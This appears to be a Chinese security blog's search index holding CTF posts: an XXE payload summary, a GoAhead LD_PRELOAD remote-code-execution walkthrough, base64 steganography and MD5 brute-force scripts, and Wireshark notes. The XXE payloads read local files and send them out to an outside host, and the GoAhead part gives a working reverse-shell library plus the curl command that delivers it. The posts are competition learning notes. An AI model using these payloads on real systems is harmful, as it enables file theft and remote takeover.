<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>XXE注入总结</title>
    <url>/2019/12/XXE%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><em>XXE即XML External Entity Injection，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）</em></p><p>这里主要是记录一些Payload</p><a id="more"></a>

<p>如果要自己复现的话，先检查自己是否安装php-xml</p>
<p><strong>一、有回显读本地敏感文件(Normal XXE)</strong></p>
<p><strong><em>xml.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>payload:</em></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY goodies SYSTEM "php://filter/read=convert.base64-encode/resource=./index.php"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191218212649252.png" alt="image-20191218212649252"></p>
<p>这里一般会利用php伪协议进行编码，防止某些特殊字符导致报错</p>
<p><strong>二、无回显读取本地敏感文件(Blind OOB XXE)</strong></p>
<p><strong><em>xml.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>payload</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.103.62.94:8888/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><strong><em>evil.dtd</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191219111929470.png" alt="image-20191219111929470"></p>
<p>这里需要注意的是读取的文件不能太大，否则会报错</p>
<p><img src="/2019/12/XXE注入总结/image-20191219112205187.png" alt="image-20191219112205187"></p>
<p>这里可以利用zlib压缩数据流</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=zlib.deflate/resource=index.php</span><br></pre></td></tr></table></figure>

<p><strong><em>evil.dtd</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=php://filter/read=zlib.deflate/resource=index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191219194710329.png" alt="image-20191219194710329"></p>
<p><strong><em>decode.py</em></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">""</span> //解密的字符串</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_inflate</span><span class="params">(b64string)</span>:</span></span><br><span class="line">    decode_base64 = base64.b64decode(b64string)</span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(decode_base64,<span class="number">-15</span>)</span><br><span class="line">print(decode_base64_inflate(str))</span><br></pre></td></tr></table></figure>

<p><strong>*三丶SVG格式XXE注入</strong></p>
<p>这个姿势是Google CTF 2019的<a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">某道题</a> 这道题的<a href="https://docs.google.com/viewerng/viewer?url=https://ctrsec.io/wp-content/uploads/2019/06/Google-CTF-2019-Writeups-Web-gphotos.pptx.pdf&hl=en" target="_blank" rel="noopener">WP</a> (注意网络)学到的</p>
<p><strong><em>svg.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE svg [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://47.103.62.94:8080/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="22px" viewBox="0 0 28 22" enable-background="new 0 0 28 22" xml:space="preserve"&gt;  &lt;image id="image0" width="28" height="22" x="0" y="0"href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA"&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$domcument = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$domcument-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$img = simplexml_import_dom($domcument);</span><br><span class="line">$attrs = $img-&gt;attributes();</span><br><span class="line">$width = (int) $attrs-&gt;width;</span><br><span class="line">$height = (int) $attrs-&gt;height;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191219192450371.png" alt="image-20191219192450371"></p>
<p>虽然报了一大堆错但数据已经带出来了</p>
<p><strong><em>四、各种平台上支持协议</em></strong></p>
<p><img src="/2019/12/XXE注入总结/20181120002647-e93bbf00-ec17-1.png" alt="20181120002647-e93bbf00-ec17-1"></p>
<p><strong><em>五、HTTP内网主机探测</em></strong></p>
<p>尝试读取网络配置文件</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta-keyword">/etc/</span>network/interfaces</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/proc/</span>net/arp</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/etc/</span>hosts</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191219225251465.png" alt="image-20191219225251465"></p>
<p><img src="/2019/12/XXE注入总结/image-20191219225453109.png" alt="image-20191219225453109"></p>
<p><img src="/2019/12/XXE注入总结/image-20191219231126267.png" alt="image-20191219231126267"></p>
<p><a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">XXE漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>base64隐写</title>
    <url>/2019/12/base64%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这种base64隐写特征很明显，就是你会得到一大堆base64的字符串但却无法解码。写过这题就很简单，但base64的原理值得我们去研究一下。<a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">参考文章</a></p><h2 id="生成正常的有等号的base64字符串"><a href="#生成正常的有等号的base64字符串" class="headerlink" title="生成正常的有等号的base64字符串"></a>生成正常的有等号的base64字符串</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>,<span class="string">'wb+'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        ran_str = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">13</span>))</span><br><span class="line">        base64str = base64.b64encode(ran_str)</span><br><span class="line">        fp.write(base64str + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'Tr0y&#123;Base64isF4n&#125;'</span>  <span class="comment"># flag</span></span><br><span class="line">bin_str = <span class="string">''</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f0, open(<span class="string">'1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f1:  <span class="comment"># '0.txt'是明文, '1.txt'用于存放隐写后的 base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">        equalnum = rowstr.count(<span class="string">'='</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> len(bin_str):</span><br><span class="line">            offset = int(<span class="string">'0b'</span> + bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[len(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum * <span class="number">2</span>:]</span><br><span class="line">        f1.write(rowstr + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">        rowb64 = <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]) - b64chars.index(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">'='</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])  <span class="comment"># 8 位一组</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title>2019NJUPT_CTF_WP</title>
    <url>/2019/11/2019NJUPT-CTF-WP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>简单的XML</p><p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122221701015.png" alt="image-20191122221701015"></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag" &gt;]&gt;</span>     </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>



<h3 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h3><p>接着用上面的payload</p>
<p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122222006279.png" alt="image-20191122222006279"></p>
<p>正如提示所说，要利用xml做更多的事情</p>
<h3 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h3><p>题目有一些过滤 后缀必须是图片的后缀</p>
<p>文件中不能出现 <code>?&gt;</code></p>
<p>上传后php代码成功就直接给flag的位置</p>
<p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122225502634.png" alt="image-20191122225502634"></p>
<p>想到页面中有个action参数</p>
<p>把flag的位置给action得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/e8849c5939285e7053ba8d7af6cb1c25/Th1s_is_a_fl4g.jpg</span><br></pre></td></tr></table></figure>

<p>4E 43 54 46</p>
<p>78 67 84 70</p>
<p>50 44 34 7E</p>
<p>80 68 52 126</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>2019红帽杯复现</title>
    <url>/2019/11/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>复现</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>湖湘杯2019复现</title>
    <url>/2019/11/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id><a href="#" class="headerlink" title></a></h2><p>打开<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">链接</a>,没什么东西。</p><p>查看源码</p><p><img src="/2019/11/2019湖湘杯web复现/image-20191109213839151.png" alt="image-20191109213839151"></p><p>进入提示的页面</p><p><img src="/2019/11/2019湖湘杯web复现/image-20191109214035812.png" alt="image-20191109214035812"></p><p>发现是GoAhead/3.6.4</p><p>百度了一下，发现 GoAhead 3.6.5之前的版本（2.5.0 – 3.6.4） 有个远程代码执行的漏洞</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。</p><a id="more"></a>







<p>我们可以指定LD_PRELOAD=/proc/self/fd/0，因为/proc/self/fd/0是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给<a href="https://link.jianshu.com?t=http%3A%2F%2Ftarget%2Fcgi-bin%2Findex%3FLD_PRELOAD%3D%2Fproc%2Fself%2Ffd%2F0" target="_blank" rel="noopener">http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</a>，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞产生于goahead/src/cgi.c:cgiHandler中，程序遍历了用户访问时所带的参数，验证如果参数不为REMOTE_HOST或HTTP_AUTHORIZATION，则将其存储至envp数组。<br> 该数组将作为接下来cgi调用的环境变量。可以看出正是这里对于参数的过滤不全，导致了用户可以修改CGI程序的LD_PRELOAD环境变量,致使漏洞存在。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>编写payload.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">attacker_addr.sin_family = AF_INET;</span><br><span class="line">attacker_addr.sin_port = htons(<span class="number">1234</span>);</span><br><span class="line">attacker_addr.sin_addr.s_addr = inet_addr(<span class="string">"ip地址"</span>);</span><br><span class="line"><span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">1</span>);</span><br><span class="line">dup2(sock, <span class="number">2</span>);</span><br><span class="line">execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译动态库(注意和服务器环境相似)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/2019湖湘杯web复现/image-20191109223215495.png" alt="image-20191109223215495"></p>
<p>会报错，但不影响使用</p>
<p>服务器先监听1234端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/2019湖湘杯web复现/image-20191109222241231.png" alt="image-20191109222241231"></p>
<p>然后执行payload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so http://183.129.189.62:13900/cgi-bin/index?LD_PRELOAD\=/proc/self/fd/0 -i | head</span><br></pre></td></tr></table></figure>

<p>服务错误就多运行几次</p>
<p><img src="/2019/11/2019湖湘杯web复现/image-20191109222659969.png" alt="image-20191109222659969"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>复现</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>Md5Crack</title>
    <url>/2019/11/Md5Crack/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="简单碰撞脚本"><a href="#简单碰撞脚本" class="headerlink" title="简单碰撞脚本"></a>简单碰撞脚本</h2><p>一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span> ,<span class="number">1000000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(i))</span><br><span class="line">    s=md.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">"721e123"</span>):</span><br><span class="line">        print(str(i))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>二:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用方法：python md5Crack.py "你要碰撞的字符串" 字符串的起始位置</span></span><br><span class="line"><span class="string">例如：python md5Crack.py “0e" 0</span></span><br><span class="line"><span class="string">将产生MD5值为0e开头的字符串。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span><span class="params">(substr, stop_event, str_len,start=<span class="number">0</span>, size=<span class="number">20</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">''</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size))</span><br><span class="line">        md51 = hashlib.md5(rnds)</span><br><span class="line">        value1 = md51.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #碰撞单MD5</span></span><br><span class="line"><span class="string">            print rnds</span></span><br><span class="line"><span class="string">            stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #碰撞双md5</span></span><br><span class="line"><span class="string">            md52 = hashlib.md5(value1)</span></span><br><span class="line"><span class="string">            if md52.hexdigest()[start: start+str_len] == substr:</span></span><br><span class="line"><span class="string">            	print rnds+ "=&gt;" + value1+"=&gt;"+ md52.hexdigest()  + "\n"</span></span><br><span class="line"><span class="string">                stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 碰撞三MD5</span></span><br><span class="line">            md52 = hashlib.md5(value1)</span><br><span class="line">            value2 = md52.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start + str_len] == substr:</span><br><span class="line">                md53 = hashlib.md5(value2)</span><br><span class="line">                <span class="keyword">if</span> md53.hexdigest()[start: start + str_len] == substr:</span><br><span class="line">                    <span class="keyword">print</span> rnds + <span class="string">"=&gt;"</span> + value1 + <span class="string">"=&gt;"</span> +value2+<span class="string">"=&gt;"</span>+ md53.hexdigest() + <span class="string">"\n"</span></span><br><span class="line">                    stop_event.set()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = int(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>

<p><a href="https://www.k2zone.cn/?p=2019" target="_blank" rel="noopener">参考文章</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MD5</tag>
        <tag>Crack</tag>
      </tags>
  </entry>
  <entry>
    <title>wireshark</title>
    <url>/2019/11/wireshark/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一、快捷键"><a href="#一、快捷键" class="headerlink" title="一、快捷键"></a>一、快捷键</h2><p>Ctrl+M 标记/取消标记<br> shift+ctrl+N/B 下/上一个被标记的数据包</p><h2 id="二、过滤器语法"><a href="#二、过滤器语法" class="headerlink" title="二、过滤器语法"></a>二、过滤器语法</h2><h3 id="1-捕获过滤器的BPF-Berkeley-Packet-Filter-语法"><a href="#1-捕获过滤器的BPF-Berkeley-Packet-Filter-语法" class="headerlink" title="1.捕获过滤器的BPF(Berkeley Packet Filter)语法"></a>1.捕获过滤器的BPF(Berkeley Packet Filter)语法</h3><p>限定词    说明                                                                  例子  </p><a id="more"></a>

<p>Type      指出名字或数字所代表的意义                         host、net、port  </p>
<p>Dir         指明传输方向是前往还是来自名字或数字      src、dst  </p>
<p>Proto     限定所要匹配的协议                                        ether、ip、tcp、udp、http、ftp</p>
<p>使用BPF语法创建的过滤器被称为表达式，每个表达式包含一个或多个原语。每个原语包含一个或多个限定词，然后跟着一个ID名字或者数字</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">&lt;----------原语---------&gt;</span>|<span class="string">&lt;操作符&gt;</span>|<span class="string">&lt;-----原语----&gt;</span>|</span><br><span class="line"> dst   host   192.168.0.10   &amp;&amp;    tcp   port   80</span><br><span class="line">|<span class="string">限定词</span>|<span class="string">限定词</span>|<span class="string">&lt;----ID----&gt;</span>|<span class="string">      </span>|<span class="string">限定词</span>|<span class="string">限定词</span>|<span class="string">ID</span>|</span><br></pre></td></tr></table></figure>

